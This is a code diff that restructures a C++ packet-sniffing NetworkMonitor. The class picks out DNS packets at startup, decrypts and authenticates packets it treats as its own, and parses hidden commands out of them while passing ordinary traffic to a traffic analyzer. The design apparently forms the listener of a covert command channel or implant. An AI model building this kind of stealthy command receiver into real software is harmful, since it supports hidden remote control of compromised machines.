@@ -22,20 +22,21 @@
 
 NetworkMonitor * NetworkMonitor::instance = nullptr;
 
-NetworkMonitor::NetworkMonitor(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, SystemState * ss) {
+NetworkMonitor::NetworkMonitor(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto) {
 
     this->crypto = crypto;
     this->trafficAnalyzer = trafficAnalyzer;
-    this->ss = ss;
+
+    this->command = new string("");
 
     if(!getInterface()){
         Logger::debug("NetworkMonitor - There Was An Error Fetching The Interface For The Monitor");
     }
 }
 
-NetworkMonitor* NetworkMonitor::getInstance(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, SystemState * ss) {
+NetworkMonitor* NetworkMonitor::getInstance(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto) {
     if(NetworkMonitor::instance == nullptr){
-        NetworkMonitor::instance = new NetworkMonitor(trafficAnalyzer, crypto, ss);
+        NetworkMonitor::instance = new NetworkMonitor(trafficAnalyzer, crypto);
     }
 
     return NetworkMonitor::instance;
@@ -165,11 +166,7 @@ void NetworkMonitor::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *p
 
     //check with SystemState for the current state. If were DORMANT. We Need To Stop!
 
-    //if we are STARTUP. Then as soon as we know its a DNS packet -> put it into the TrafficAnalyzer and halt
-
-
     char * BUFFER = (char *)(packet + 16);
-
     struct iphdr * ip = (struct iphdr *)BUFFER;
     int ipHeaderLength = (ip->ihl * 4);
     int protocol = (ip->protocol);
@@ -184,49 +181,94 @@ void NetworkMonitor::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *p
     if(applicationLayer == nullptr){
         Logger::debug("NetworkMonitor:listenForTraffic - Could Not Find Application Layer. Can't Do Anything With Packet");
         return;
-    }else{
+    }
+
+    //if we are STARTUP. Then as soon as we know its a DNS packet -> put it into the TrafficAnalyzer and halt
+    if(SystemState::currentState == SystemState::STARTUP){
+        Logger::debug("NetworkMonitor:listenForTraffic - STARTUP State Detected. Only Searching For DNS Packets");
+        if(meta.applicationType != ApplicationType::DNS){
+            return;
+        }else{
+            //it is a DNS packet
+            NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
+            NetworkMonitor::instance->killListening();
+            return;
+        }
+    }
+
+    //if it is a TLS packet, the auth information is in the payload. We need to decrypt first before authenticating
+    if(meta.applicationType == ApplicationType::TLS){
+        Logger::debug("NetworkMonitor:listenForTraffic - Packet Is TLS. Must Decrypt First Before Authenticating");
+
+        //we need to decrypt first before authenticating
         if(NetworkMonitor::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
             Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Decrypting The Packet. Can't Use Packet If It Contains Information");
 
             //could be a situation here where decryptPacket thought it was TLS but if Authenticator approves it and says its not TLS, something
             //will have gone wrong
 
-
             //add the packet to history assuming its not ours
             NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
             return;
         }
-    }
 
-    Logger::debug("NetworkMonitor:listenForTraffic - Decryption Complete. Now Authenticating");
-    if(Authenticator::isAuthenticPacket(&meta)){
+        Logger::debug("NetworkMonitor:listenForTraffic - TLS Decryption Successfull. Now Authenticating");
+        //now authenticate
+        if(Authenticator::isAuthenticPacket(&meta)){
+            Logger::debug("NetworkMonitor:listenForTraffic - TLS Packet IS Ours. Parsing Contents");
 
-        //packet has been successfully authenticated. Now to parse out what we need of the message
-        //need to determine what type fo packet again based off meta to know what to grab from where
-
-        Logger::debug("NetworkMonitor:listenForTraffic - Packet Is Ours. Parsing Contents");
-
-        if(meta.applicationType != ApplicationType::UNKNOWN){
-            Logger::debug("NetworkMonitor:listenForTraffic - Packet Contains Our Data In The Application Layer");
             NetworkMonitor::instance->parseApplicationContent(&meta, applicationLayer);
         }else{
-            Logger::debug("NetworkMonitor:listenForTraffic - Packet Contains Our Data In The Transport Layer");
-            NetworkMonitor::instance->parseTransportContent(&meta);
+            Logger::debug("NetworkMonitor:listenForTraffic - TLS Packet Is Not Ours. Add To TrafficAnayzer");
+            //if it is not our packet give it to the TrafficAnalyzer
+            NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
         }
 
-        //if we have received the full message then kill listening so that our hanging method will return
-        if(NetworkMonitor::instance->isFullCommand()){
-            NetworkMonitor::instance->killListening();
-        }
-
-
+        //else this is not a TLS packet and we can Authenticate it first before decrypting
     }else{
-        Logger::debug("NetworkMonitor:listenForTraffic - Packet Is Not Ours. Add To Traffic Analyzer");
-        //if it is not our packet give it to the TrafficAnalyzer
-        NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
+
+        Logger::debug("NetworkMonitor:listenForTraffic - Packet Is Not TLS. Authenticating Before Decryption");
+        //authenticate first
+        if(Authenticator::isAuthenticPacket(&meta)){
+
+            //then decrypt
+            Logger::debug("NetworkMonitor:listenForTraffic - Non-TLS Packet Is Ours. Now Decrypting");
+
+            if(NetworkMonitor::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
+                Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Decrypting The Non-TLS Packet. Can't Use Packet If It Contains Information");
+
+                //could be a situation here where decryptPacket thought it was TLS but if Authenticator approves it and says its not TLS, something
+                //will have gone wrong
+
+                //add the packet to history assuming its not ours
+                NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
+                return;
+            }
+
+            //decryption was successful
+            Logger::debug("NetworkMonitor:listenForTraffic - Non-TLS Decryption Successful. Now Parsing Contents");
+
+            if(meta.applicationType != ApplicationType::UNKNOWN){
+                Logger::debug("NetworkMonitor:listenForTraffic - Packet Contains Our Data In The Application Layer");
+                NetworkMonitor::instance->parseApplicationContent(&meta, applicationLayer);
+            }else{
+                Logger::debug("NetworkMonitor:listenForTraffic - Packet Contains Our Data In The Transport Layer");
+                NetworkMonitor::instance->parseTransportContent(&meta);
+            }
+
+
+        }else{
+            Logger::debug("NetworkMonitor:listenForTraffic - Non-TLS Packet Is Not Ours. Add To TrafficAnalyzer");
+            //if it is not our packet give it to the TrafficAnalyzer
+            NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
+        }
 
     }
 
+    //if we have received the full message then kill listening so that our hanging method will return
+    if(NetworkMonitor::instance->isFullCommand()){
+        NetworkMonitor::instance->killListening();
+    }
 
 }
 
@@ -283,6 +325,11 @@ string * NetworkMonitor::listenForTraffic() {
 
     //determine how we should listen - ask the SystemState what the current state is
     //if STARTUP then we need to only listen for DNS packets
+
+
+    //clear command
+    delete(this->command);
+    this->command = new string("");
 
     char errbuf[PCAP_ERRBUF_SIZE];
     bpf_u_int32 subnetMask;
